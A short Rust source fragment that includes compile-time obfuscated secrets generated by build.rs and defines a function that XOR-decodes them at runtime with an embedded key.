// Embed compile-time obfuscated secrets (generated by build.rs)
mod secrets {
    include!(concat!(env!("OUT_DIR"), "/embedded_secrets.rs"));
}

/// XOR decode at runtime — mirrors the XOR encode in build.rs
fn xor_decrypt(data: &[u8]) -> Vec<u8> {
    let key = secrets::XOR_KEY;
    data.iter()
        .enumerate()
        .map(|(i, b)| b ^ key[i % key.len()])
        .collect()
}

